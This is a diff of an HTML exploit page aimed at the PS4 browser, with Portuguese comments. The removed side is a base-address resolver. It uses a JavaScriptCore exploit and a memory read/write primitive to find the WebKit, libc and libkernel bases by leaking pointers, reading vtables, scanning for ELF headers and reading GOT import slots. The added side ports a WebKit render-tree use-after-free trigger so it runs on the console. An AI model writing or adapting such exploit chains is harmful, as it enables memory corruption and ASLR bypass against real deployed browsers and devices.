@@ -1,436 +1,68 @@
-
 <!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>PS4 13.52 — Multi-Method Base Resolver</title>
+<!--
+  Adapta��o de render-tree-as-text-uaf.html (commit 3f3fec2)
+  para execu��o no PS4 browser (libSceNKWebKit / AppleWebKit 605.1.15 / Orbis OS)
+  sem depend�ncias de internals ou testRunner.
+-->
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#060810;color:#c8cfd8;font:13px/1.5 monospace;min-height:100vh;
-  display:flex;flex-direction:column;align-items:center;padding:20px}
-h1{font-size:15px;color:#00c8ff;letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
-#fw{font-size:11px;color:#555;margin-bottom:14px}
-#con{width:100%;max-width:760px;height:520px;background:#050508;border:1px solid #1a1d2e;
-  border-radius:6px;overflow-y:auto;padding:10px 12px;font-size:11px;line-height:1.55}
-.i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
-.e{color:#ff5252;font-weight:bold}.s{color:#00c8ff;border-top:1px solid #1a1d2e;margin-top:4px;padding-top:4px}
-.d{color:#777}
+  iframe {
+    content: url();      /* cria RenderWidget com CSS generated content � manter */
+    zoom: 0.01;          /* for�a layout path espec�fico no RenderWidget � manter */
+
+    /*
+     * Proxy para setAsyncFrameScrollingEnabled(true):
+     * overflow: scroll promove o iframe a um composited scroll layer,
+     * replicando parcialmente o efeito de async frame scrolling.
+     * N�o � equivalente exato � setAsyncFrameScrollingEnabled atua
+     * direto no FrameView compositor; isto apenas for�a promo��o de layer.
+     */
+    overflow: scroll;
+  }
 </style>
-</head>
-<body>
-<h1>PS4 13.52 — Multi-Method Base Resolver</h1>
-<div id="fw">detectando...</div>
-<div id="con"></div>
+<script>
+  /*
+   * setCaretBrowsingEnabled(true): sem API JS equivalente em produ��o.
+   * O caret browsing muda o comportamento de foco em frames; sem ele,
+   * a sequ�ncia de onfocus ? location.hash pode ter timing diferente.
+   * Compensamos garantindo que o iframe seja foc�vel via tabindex="0".
+   *
+   * setAsyncFrameScrollingEnabled(true): veja CSS acima.
+   *
+   * testRunner.dumpAsText(): removido � s� existe no WebKitTestRunner.
+   * ATEN��O: sem ele, write() em RenderTreeAsText.cpp n�o � acionado
+   * por este HTML. O trigger para o UAF precisa ser externo (Remote
+   * Web Inspector do PS4 disparando a dump da render tree).
+   */
 
-<script src="./13.52.js?v=6"></script>
-<script type="module">
-import { int64 } from './resources/int64.js';
-import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP } from './resources/mem.js';
-globalThis.int64 = int64;
+  onload = () => {
+    document.documentElement.append(document.createElement('frameset'));
 
-const $con = document.getElementById('con');
-const $fw = document.getElementById('fw');
+    i0.onfocus = () => {
+      location.hash = 'y';
+    };
 
-function log(m, c='i') {
-  const d = document.createElement('div'); d.className = c;
-  d.textContent = m; $con.appendChild(d);
-  $con.scrollTop = $con.scrollHeight;
-  while ($con.children.length > 400) $con.removeChild($con.firstChild);
-}
-function logH(m) { log('=== ' + m + ' ===', 's'); }
+    location.hash = 'x';
 
-function fixApi(p) {
-  if (!p.read4 && p.read32) p.read4 = p.read32;
-  if (!p.read8 && p.read64) p.read8 = p.read64;
-  if (!p.write4 && p.write32) p.write4 = p.write32;
-  if (!p.write8 && p.write64) p.write8 = p.write64;
-  if (!p.read1) p.read1 = function(a) { return this.read4(a) & 0xFF; };
-  if (!p.leakval) p.leakval = function(v) { /* fallback */ return null; };
-  return p;
-}
-
-function read1(p, a) { return p.read4(a) & 0xFF; }
-function read2(p, a) { return p.read4(a) & 0xFFFF; }
-function read4(p, a) { return p.read4(a); }
-function read8(p, a) { return p.read8(a); }
-
-function addrAdd(a, off) {
-  if (typeof off === 'number') return a.add32(off);
-  return a.add32(off.low !== undefined ? off.low : off);
-}
-function addrSub(a, off) {
-  if (typeof off === 'number') return a.sub32(off);
-  return a.sub32(off.low !== undefined ? off.low : off);
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// MÉTODO 1: __ps5NativeCtor
-// ═════════════════════════════════════════════════════════════════════════════
-function method1_nativeCtor() {
-  logH('METODO 1: __ps5NativeCtor');
-  const ctor = globalThis.__ps5NativeCtor;
-  log('    __ps5NativeCtor = ' + ctor + ' (type=' + typeof ctor + ')');
-
-  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    log('    [-] __ps5NativeCtor invalido ou nao capturado', 'w');
-    return null;
-  }
-
-  const hi = Math.floor(ctor / 0x100000000);
-  const lo = ctor - hi * 0x100000000;
-  const ctor64 = new int64(lo >>> 0, hi >>> 0);
-  log('    ctor64 = 0x' + ctor64.toString(16));
-
-  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
-             ? OFFSET_wk_host_constructor_candidates[0] : 0x36F9E20;
-  log('    host_constructor offset = 0x' + hc.toString(16));
-
-  const baseVal = ctor - hc;
-  const bHi = Math.floor(baseVal / 0x100000000);
-  const bLo = baseVal - bHi * 0x100000000;
-  const base = new int64(bLo >>> 0, bHi >>> 0);
-  log('    candidato base = 0x' + base.toString(16));
-  return base;
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// MÉTODO 2: Vtable de objeto DOM
-// ═════════════════════════════════════════════════════════════════════════════
-function method2_vtable(p) {
-  logH('METODO 2: Vtable de objeto DOM');
-
-  if (!p.leakval) {
-    log('    [-] p.leakval nao disponivel', 'w');
-    return null;
-  }
-
-  try {
-    // Criar um textarea e pegar seu vtable
-    const ta = document.createElement('textarea');
-    const taCell = p.leakval(ta);
-    log('    textarea cell = 0x' + taCell.toString(16));
-
-    // No JSC, objeto JSWrapper tem:
-    // cell[0] = JSCell header
-    // cell[1] = butterfly (ou nullptr)
-    // cell[2] = vtable ptr (para C++ object)
-    // Mas o layout exato depende da versao do WebKit
-
-    // Tentar ler o que parece ser um ponteiro no cell
-    const ptr0 = read8(p, taCell);
-    const ptr1 = read8(p, addrAdd(taCell, 8));
-    const ptr2 = read8(p, addrAdd(taCell, 16));
-    const ptr3 = read8(p, addrAdd(taCell, 24));
-
-    log('    cell[0x00] = 0x' + ptr0.toString(16));
-    log('    cell[0x08] = 0x' + ptr1.toString(16));
-    log('    cell[0x10] = 0x' + ptr2.toString(16));
-    log('    cell[0x18] = 0x' + ptr3.toString(16));
-
-    // Procurar por ponteiro que pareca estar na regiao do WebKit
-    // (hi = 0x00000000 ou 0xFFFFFFFF para userland PS4)
-    const candidates = [ptr0, ptr1, ptr2, ptr3];
-    for (let i = 0; i < candidates.length; i++) {
-      const ptr = candidates[i];
-      if (ptr.hi === 0 || ptr.hi === -1) {
-        // Pode ser um ponteiro valido
-        // Tentar ler como se fosse vtable
-        try {
-          const vt0 = read8(p, ptr);
-          log('    cell[' + (i*8) + '] -> read8(0x' + ptr.toString(16) + ') = 0x' + vt0.toString(16));
-          if (vt0.hi === 0 || vt0.hi === -1) {
-            // Pode ser vtable -> primeiro elemento
-            // No slopkit, vtable_first_element é usado para achar base
-            // Se tivermos OFFSET_wk_vtable_first_element, podemos usar
-            if (typeof OFFSET_wk_vtable_first_element !== 'undefined' && OFFSET_wk_vtable_first_element !== 0) {
-              const base = addrSub(vt0, OFFSET_wk_vtable_first_element);
-              log('    base via vtable = 0x' + base.toString(16));
-              return base;
-            }
-          }
-        } catch(e) {}
-      }
-    }
-    log('    [-] Nao conseguiu extrair base do vtable', 'w');
-  } catch (e) {
-    log('    [-] Erro: ' + (e.message || e), 'e');
-  }
-  return null;
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// MÉTODO 3: Procurar ELF magic na memoria (scan)
-// ═════════════════════════════════════════════════════════════════════════════
-function method3_scan(p) {
-  logH('METODO 3: Scan por ELF magic na memoria');
-
-  // No PS4, o WebKit e geralmente mapeado em uma regiao alta
-  // Vamos tentar achar o ELF magic varrendo uma regiao plausivel
-  // Comecando de um endereco alto e descendo
-
-  // Tentar primeiro com o candidato do metodo 1, mas varrendo ao redor
-  const ctor = globalThis.__ps5NativeCtor;
-  if (typeof ctor === 'number' && ctor > 0x100000000) {
-    const hi = Math.floor(ctor / 0x100000000);
-    const lo = ctor - hi * 0x100000000;
-    const ctor64 = new int64(lo >>> 0, hi >>> 0);
-
-    // Varredura em torno do ctor (±16MB)
-    log('    Varrendo em torno de __ps5NativeCtor (0x' + ctor64.toString(16) + ')...');
-    for (let back = 0; back < 0x2000000; back += 0x1000) {
-      try {
-        const test = addrSub(ctor64, back);
-        if (read4(p, test) === 0x464C457F) {
-          log('    [+] ELF magic encontrado @ 0x' + test.toString(16) + ' (back=0x' + back.toString(16) + ')', 'ok');
-          return test;
-        }
-      } catch(e) {}
-    }
-  }
-
-  // Se nao achou, tentar varrer desde um endereco fixo alto
-  // No PS4, modulos userland geralmente comecam em 0x800000000
-  log('    Varrendo desde 0x800000000...');
-  const start = new int64(0, 0x80); // 0x800000000
-  for (let off = 0; off < 0x10000000; off += 0x1000) {
-    try {
-      const test = addrAdd(start, off);
-      if (read4(p, test) === 0x464C457F) {
-        log('    [+] ELF magic @ 0x' + test.toString(16), 'ok');
-        return test;
-      }
-    } catch(e) {}
-  }
-
-  log('    [-] Nao encontrou ELF magic', 'e');
-  return null;
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// MÉTODO 4: Usar p.read8 em enderecos conhecidos do WebKit
-// ═════════════════════════════════════════════════════════════════════════════
-function method4_knownRegions(p) {
-  logH('METODO 4: Testar regioes conhecidas do WebKit');
-
-  // No PS4, o WebKit pode estar em enderecos como:
-  // 0x800000000, 0x80a000000, etc.
-  // Vamos tentar alguns candidatos baseados no __ps5NativeCtor
-
-  const ctor = globalThis.__ps5NativeCtor;
-  if (typeof ctor !== 'number' || ctor <= 0x100000000) {
-    log('    [-] __ps5NativeCtor nao disponivel', 'w');
-    return null;
-  }
-
-  // O ctor esta a ~55.5MB do inicio do WebKit
-  // Mas talvez o modulo seja maior no PS4
-  // Tentar subtrair multiplos do tamanho do modulo
-
-  const sizes = [
-    0x36F9E20,   // 55.5 MB (PS5)
-    0x3700000,   // 55.8 MB
-    0x3800000,   // 56 MB
-    0x4000000,   // 64 MB
-    0x4500000,   // 69 MB
-    0x5000000,   // 80 MB
-  ];
-
-  const hi = Math.floor(ctor / 0x100000000);
-  const lo = ctor - hi * 0x100000000;
-  const ctor64 = new int64(lo >>> 0, hi >>> 0);
-
-  for (const size of sizes) {
-    try {
-      const base = addrSub(ctor64, size);
-      const magic = read4(p, base);
-      log('    ctor - 0x' + size.toString(16) + ' = 0x' + base.toString(16) + ' -> magic=0x' + magic.toString(16));
-      if (magic === 0x464C457F) {
-        log('    [+] ELF magic encontrado!', 'ok');
-        return base;
-      }
-    } catch(e) {
-      log('    ctor - 0x' + size.toString(16) + ' -> crash na leitura', 'd');
-    }
-  }
-
-  log('    [-] Nenhum candidato funcionou', 'w');
-  return null;
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// VALIDAR BASE
-// ═════════════════════════════════════════════════════════════════════════════
-function validateBase(p, base, name) {
-  if (!base) return false;
-  try {
-    const magic = read4(p, base);
-    const ok = (magic === 0x464C457F);
-    log('    [' + (ok ? '+' : '-') + '] ' + name + ' @ 0x' + base.toString(16) + ' magic=0x' + magic.toString(16) + (ok ? ' (ELF OK)' : ' (INVALIDO)'), ok ? 'ok' : 'e');
-    return ok;
-  } catch(e) {
-    log('    [-] ' + name + ' @ 0x' + base.toString(16) + ' -> crash: ' + (e.message || e), 'e');
-    return false;
-  }
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// RESOLVER BASES VIA IMPORTS (usando base validada)
-// ═════════════════════════════════════════════════════════════════════════════
-function resolveViaImports(p, webkitBase) {
-  logH('RESOLVENDO BASES VIA IMPORTS (offsets estaticos)');
-
-  let libcBase = null;
-  let libkernelBase = null;
-
-  // libc
-  if (OFFSET_wk_memset_import && OFFSET_lc_memset) {
-    try {
-      const slot = addrAdd(webkitBase, OFFSET_wk_memset_import);
-      const ptr = read8(p, slot);
-      log('    GOT memset @ wk+0x' + OFFSET_wk_memset_import.toString(16) + ' = 0x' + ptr.toString(16));
-      libcBase = addrSub(ptr, OFFSET_lc_memset);
-      log('    libcBase = 0x' + libcBase.toString(16));
-      if (validateBase(p, libcBase, 'libcBase')) {
-        // ok
-      } else {
-        libcBase = null;
-      }
-    } catch(e) {
-      log('    [-] Erro libc: ' + (e.message || e), 'e');
-    }
-  } else {
-    log('    [!] OFFSET_wk_memset_import ou OFFSET_lc_memset = 0', 'w');
-  }
-
-  // libkernel
-  if (OFFSET_wk___stack_chk_guard_import && OFFSET_lk___stack_chk_guard) {
-    try {
-      const slot = addrAdd(webkitBase, OFFSET_wk___stack_chk_guard_import);
-      const ptr = read8(p, slot);
-      log('    GOT guard @ wk+0x' + OFFSET_wk___stack_chk_guard_import.toString(16) + ' = 0x' + ptr.toString(16));
-      libkernelBase = addrSub(ptr, OFFSET_lk___stack_chk_guard);
-      log('    libkernelBase = 0x' + libkernelBase.toString(16));
-      if (validateBase(p, libkernelBase, 'libkernelBase')) {
-        // ok
-      } else {
-        libkernelBase = null;
-      }
-    } catch(e) {
-      log('    [-] Erro libkernel: ' + (e.message || e), 'e');
-    }
-  } else {
-    log('    [!] OFFSET_wk___stack_chk_guard_import ou OFFSET_lk___stack_chk_guard = 0', 'w');
-  }
-
-  return { libcBase, libkernelBase };
-}
-
-// ═════════════════════════════════════════════════════════════════════════════
-// MAIN
-// ═════════════════════════════════════════════════════════════════════════════
-async function main() {
-  const ua = navigator.userAgent;
-  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
-  $fw.textContent = fw ? 'PS4 firmware ' + fw[1] : ua.slice(0, 50);
-  log('UA: ' + ua, 'd');
-
-  logH('STAGE 1: EXPLOIT JSC');
-  let carrier;
-  try {
-    carrier = await establishPrimitive({ maxAttempts: 0 });
-  } catch (err) {
-    log('[-] core.js: ' + err.message, 'e'); return;
-  }
-  log('[+] core.js OK', 'ok');
-
-  logH('STAGE 2: R/W PRIMITIVE');
-  let p;
-  try {
-    p = installWindowP(carrier, { promote: true });
-    p = fixApi(p);
-  } catch (err) {
-    log('[-] mem.js: ' + err.message, 'e'); return;
-  }
-  log('[+] mem.js OK', 'ok');
-
-  // Teste basico de R/W
-  logH('TESTE BASICO DE R/W');
-  try {
-    const testAddr = new int64(0, 0); // null pointer - vai crashar se R/W nao funcionar
-    // Na verdade, ler de null vai crashar. Vamos ler de um endereco do proprio JS heap
-    // usando leakval
-    if (p.leakval) {
-      const testObj = {};
-      const leaked = p.leakval(testObj);
-      log('    leakval({}) = 0x' + leaked.toString(16));
-      const val = read8(p, leaked);
-      log('    read8(leaked) = 0x' + val.toString(16) + ' (R/W funciona!)', 'ok');
+    /*
+     * Original (sintaxe inv�lida fora do WebKit REPL interno):
+     *   s0.src = data:text/javascript,caches.has('a').then(() => i0.focus());;
+     *
+     * Dois problemas:
+     *   1. Sem aspas ao redor do data: URI ? SyntaxError/ReferenceError
+     *   2. Cache API pode n�o estar dispon�vel no firmware PS4 alvo
+     *
+     * Solu��o: verifica��o de disponibilidade + fallback em Promise microtask
+     * (timing ass�ncrono equivalente ao then() da Cache API).
+     */
+    if (typeof caches !== 'undefined') {
+      const s0 = document.createElement('script');
+      s0.src = 'data:text/javascript,caches.has("a").then(()=>document.getElementById("i0").focus())';
+      document.head.append(s0);
     } else {
-      log('    [!] p.leakval nao disponivel', 'w');
+      // Fallback: microtask com timing similar ao IDBRequest / CacheStorage
+      Promise.resolve().then(() => i0.focus());
     }
-  } catch(e) {
-    log('    [-] Teste R/W falhou: ' + (e.message || e), 'e');
-  }
-
-  logH('STAGE 3: RESOLVENDO WEBKIT BASE');
-
-  let webkitBase = null;
-  let method = '';
-
-  // Tentar metodo 1
-  const m1 = method1_nativeCtor();
-  if (m1 && validateBase(p, m1, 'Metodo 1')) {
-    webkitBase = m1; method = 'nativeCtor';
-  }
-
-  // Tentar metodo 2
-  if (!webkitBase) {
-    const m2 = method2_vtable(p);
-    if (m2 && validateBase(p, m2, 'Metodo 2')) {
-      webkitBase = m2; method = 'vtable';
-    }
-  }
-
-  // Tentar metodo 4 (variacoes de offset)
-  if (!webkitBase) {
-    const m4 = method4_knownRegions(p);
-    if (m4 && validateBase(p, m4, 'Metodo 4')) {
-      webkitBase = m4; method = 'knownRegions';
-    }
-  }
-
-  // Tentar metodo 3 (scan completo)
-  if (!webkitBase) {
-    const m3 = method3_scan(p);
-    if (m3 && validateBase(p, m3, 'Metodo 3')) {
-      webkitBase = m3; method = 'scan';
-    }
-  }
-
-  if (!webkitBase) {
-    log('[-] ===== NENHUM METODO FUNCIONOU =====', 'e');
-    return;
-  }
-
-  log('[+] WebKit Base = 0x' + webkitBase.toString(16) + ' (via ' + method + ')', 'ok');
-
-  logH('STAGE 4: RESOLVENDO OUTRAS BASES');
-  const { libcBase, libkernelBase } = resolveViaImports(p, webkitBase);
-
-  logH('RESULTADO FINAL');
-  log('WebKit Base     = 0x' + webkitBase.toString(16) + ' (' + method + ')');
-  log('libkernel Base  = ' + (libkernelBase ? '0x' + libkernelBase.toString(16) : 'FALHOU'));
-  log('libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'FALHOU'));
-
-  if (libkernelBase && libcBase) {
-    log('[+] ===== TODAS AS BASES OK =====', 'ok');
-  } else {
-    log('[-] ===== ALGUMA BASE FALHOU =====', 'e');
-  }
-}
-
-main();
+  };
 </script>
-</body>
-</html>
+
+<iframe id="i0" tabindex="0"></iframe>
